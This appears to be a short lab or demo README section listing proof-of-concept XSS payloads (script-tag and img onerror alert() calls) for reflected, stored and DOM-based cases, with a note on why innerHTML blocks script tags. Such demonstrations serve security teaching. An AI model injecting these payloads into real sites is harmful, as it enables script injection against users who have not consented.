# Attack

### Reflected XSS

Payload

```bash
<script>alert('Hacked!')</script>
```

### Stored XSS

Payload

```bash
<script>alert('Hacked!')</script>
```

### DOM-based XSS

Payload: 

```bash
<img src=x onerror="alert('XSS Attack')">
```

> [!NOTE]
> 
> The attack may seem a bit convoluted, and it is, but that's because there are basic protections to prevent the simplest XSS attacks; [script](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML) tags added via innerHTML are not executed automatically.
